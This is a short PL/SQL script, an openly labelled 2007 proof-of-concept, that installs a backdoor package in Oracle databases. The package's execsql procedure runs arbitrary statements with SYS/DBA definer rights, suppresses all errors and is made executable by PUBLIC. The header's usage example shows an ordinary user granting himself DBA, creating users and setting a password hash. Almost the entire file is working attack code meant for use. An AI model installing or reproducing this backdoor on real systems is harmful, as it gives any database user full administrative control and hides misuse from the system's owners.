--
-- $Id: orabackdoor.sql,v 1.1 2007/01/25 10:25:18 raptor Exp $
--
-- orabackdoor.sql - basic oracle backdoor proof-of-concept
-- Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info>
--
-- This PL/SQL code demonstrates how to write a simple backdoor for the
-- Oracle RDBMS, to execute arbitrary PL/SQL commands with DBA privileges.
--
-- "When a PL/SQL procedure executes, it does so with the permission of the
-- user that defined the procedure. What this means is that if SYS creates
-- a procedure and SCOTT executes it, the procedure executes with SYS 
-- privileges." -- David Litchfield (http://www.databasesecurity.com/)
--
-- Shoutz to Raist and Gippo!
--
-- See also:
-- http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql
-- http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql
-- http://www.0xdeadbeef.info/exploits/raptor_orafile.sql
--
-- Tested on:
-- Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production
-- Oracle Database 10g Enterprise Edition Release 10.1.0.4.2 - 64bit Production
--
-- Usage example:
-- $ sqlplus "/ as sysdba"
-- SQL> @orabackdoor.sql
-- SQL> quit
-- [...]
-- $ sqlplus scott/tiger
-- SQL> select * from user_role_privs;
-- no rows selected
-- SQL> exec sys.orabackdoor.execsql('grant dba to scott');
-- SQL> select * from user_role_privs;
-- USERNAME                       GRANTED_ROLE                   ADM DEF OS_
-- ------------------------------ ------------------------------ --- --- ---
-- SCOTT                          DBA                            NO  YES NO
-- SQL> exec sys.orabackdoor.execsql('revoke dba from scott');
-- [...]
-- SQL> select username from all_users where username='FOO';
-- no rows selected
-- SQL> exec sys.orabackdoor.execsql('create user foo identified by bar');
-- SQL> select username from all_users where username='FOO';
-- USERNAME
-- ------------------------------
-- FOO
-- SQL> exec sys.orabackdoor.execsql('alter user FOO identified by values ''F0F248ABC44031CB''');
-- SQL> exec sys.orabackdoor.execsql('drop user foo');
--

-- create the backdoor package
create or replace package orabackdoor as
	procedure execsql(cmdstring in varchar2);
end orabackdoor;
/

-- execute arbitrary PL/SQL code with definer rights
--
-- usage: exec orabackdoor.execsql('pl/sql code');
create or replace package body orabackdoor as
	procedure execsql(cmdstring in varchar2) as
	begin
		execute immediate cmdstring;
		exception when others then
			null;
	end;
end orabackdoor;
/

-- make the backdoor package executable by everyone
grant execute on orabackdoor to public;
